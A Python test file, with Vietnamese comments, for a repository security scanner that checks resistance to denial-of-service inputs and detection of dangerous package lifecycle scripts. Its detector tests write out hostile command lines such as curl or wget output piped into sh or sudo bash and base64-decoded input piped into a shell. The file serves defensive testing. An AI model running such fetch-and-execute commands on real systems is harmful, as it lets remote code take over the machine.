"""Tệp thù địch không được biến chính công cụ thành nạn nhân.

Mô hình đe doạ ở đây rất cụ thể: kẻ tấn công không chạy được mã trên máy nạn
nhân, nhưng đặt được nội dung vào một repo và nhờ nạn nhân quét nó -- một pull
request, một package phụ thuộc, một kho mở. Nếu một tệp 2 MB đủ để treo lượt
quét hàng giờ thì cổng CI của nạn nhân chết, và nó chết theo kiểu khó truy ra.

Mỗi kiểm tra dưới đây là một hình dạng đã từng làm sập thật, kèm trần thời
gian rộng rãi ( máy CI chạy song song nhiều việc ). Trần rộng vẫn bắt được
đúng thứ cần bắt: những lỗi đã vá đo bằng chục giây tới hàng giờ, không phải
bằng phần trăm giây.
"""

from __future__ import annotations

import time

import pytest

from fortress_scan.analysis import manifest
from fortress_scan.core.config import Config
from fortress_scan.core.engine import scan_source
from fortress_scan.languages import JAVASCRIPT, MANIFEST, WORKFLOW
from fortress_scan.security.redaction import MAX_REDACT_LENGTH, redact

BUDGET_SECONDS = 15.0


def _timed(run) -> float:
    started = time.perf_counter()
    run()
    return time.perf_counter() - started


def test_minified_javascript_on_one_line_does_not_hang():
    """Đường đi thật của lỗi redact() bậc hai.

    redact() chạy trên TỪNG dòng sinh ra trích đoạn của mọi phát hiện. Một
    tệp đã minify chỉ có một dòng, nên "một dòng" ở đây là cả 2 MB.
    """
    source = "var x = '" + "eyJA." * 400_000 + "'; eval(x)"
    elapsed = _timed(lambda: scan_source(source, JAVASCRIPT, "app.min.js", Config()))
    assert elapsed < BUDGET_SECONDS, "tốn %.1fs" % elapsed


def test_redact_is_bounded_by_input_length():
    haystack = "eyJ" + "A." * 200_000
    assert _timed(lambda: redact(haystack)) < 1.0
    # Cắt đầu vào là lưới an toàn thứ hai, độc lập với việc từng mẫu có tuyến
    # tính hay không. Mọi thứ redact() trả về đều bị cắt còn vài trăm ký tự ở
    # bước sau, nên soi quá mức này không thêm được gì vào báo cáo.
    assert len(redact("a" * (MAX_REDACT_LENGTH * 4))) <= MAX_REDACT_LENGTH


def test_redact_still_hides_secrets_after_the_bound():
    assert "[redacted]" in redact('url = "https://nguoi_dung:matkhauthat@vi_du.com/x"')
    assert "matkhauthat" not in redact('url = "https://nguoi_dung:matkhauthat@vi_du.com/x"')


@pytest.mark.parametrize(
    "payload",
    [
        "curl -o ",
        "curl |",
        "wget --output ",
        "base64 -d |",
        "atob ",
    ],
)
def test_hostile_lifecycle_script_does_not_hang(payload: str):
    """Bản cũ tốn 23 giây cho 200 KB kiểu này, và tệp cho phép tới 2 MB."""
    source = '{"scripts":{"postinstall":"%s"}}' % (payload * (2_000_000 // len(payload)))
    elapsed = _timed(lambda: scan_source(source, MANIFEST, "package.json", Config()))
    assert elapsed < BUDGET_SECONDS, "tốn %.1fs" % elapsed


def test_lifecycle_command_count_is_capped():
    """Một khoá vòng đời nhận cả danh sách, nên số lệnh phải có chặn trên.

    Thiếu nó thì `{"postinstall": ["...4000 ký tự...", x500]}` gói gọn trong
    2 MB mà bắt bộ dò làm việc gấp 500 lần -- và con số đó còn nhân tiếp với
    số package.json trong một kho monorepo.
    """
    document = {"postinstall": ["curl -o x" for _ in range(5_000)]}
    assert len(list(manifest._lifecycle_commands(document))) == manifest.MAX_LIFECYCLE_COMMANDS


def test_lifecycle_command_length_is_capped():
    document = {"postinstall": "a" * (manifest.MAX_COMMAND_LENGTH * 4)}
    for _, command in manifest._lifecycle_commands(document):
        assert len(command) <= manifest.MAX_COMMAND_LENGTH


def test_unclosed_workflow_expressions_do_not_hang():
    """`${{` lặp mà không bao giờ đóng: bản dùng regex lười tốn 1,4s cho 200 KB."""
    source = "on: push\njobs:\n  b:\n    steps:\n      - run: " + "${{" * 300_000
    elapsed = _timed(lambda: scan_source(source, WORKFLOW, ".github/workflows/ci.yml", Config()))
    assert elapsed < BUDGET_SECONDS, "tốn %.1fs" % elapsed


def test_many_real_workflow_expressions_stay_bounded():
    source = "on: issue_comment\n" + "      - run: ${{ github.event.issue.title }}\n" * 20_000
    elapsed = _timed(lambda: scan_source(source, WORKFLOW, ".github/workflows/ci.yml", Config()))
    assert elapsed < BUDGET_SECONDS, "tốn %.1fs" % elapsed


def test_manifest_detection_survived_the_rewrite():
    """Viết lại để chạy nhanh mà mất khả năng nhận dạng thì là đổi lỗ hổng
    này lấy lỗ hổng khác."""
    assert manifest.fetch_pipes_into_interpreter("curl -sSL https://vi.du/s.sh | sh")
    assert manifest.fetch_pipes_into_interpreter("wget -qO- https://vi.du/s.sh | sudo bash")
    assert manifest.fetch_then_executes("curl -o s.sh https://vi.du/s.sh; sh s.sh")
    assert manifest.fetch_then_executes("curl --output s.sh https://vi.du/s.sh && ./s.sh")
    assert manifest.decoded_pipes_into_interpreter("echo x | base64 -d | sh")

    # Và không được nhận bừa những dòng lành.
    assert not manifest.fetch_pipes_into_interpreter("curl -o out.json https://vi.du/a.json")
    assert not manifest.fetch_pipes_into_interpreter("echo curl; ls | wc -l")
    assert not manifest.fetch_then_executes("curl -o out.json https://vi.du/a.json")
    assert not manifest.fetch_then_executes("curl https://vi.du/a.json; echo xong")
    assert not manifest.decoded_pipes_into_interpreter("base64 -d payload.b64 > out.bin")
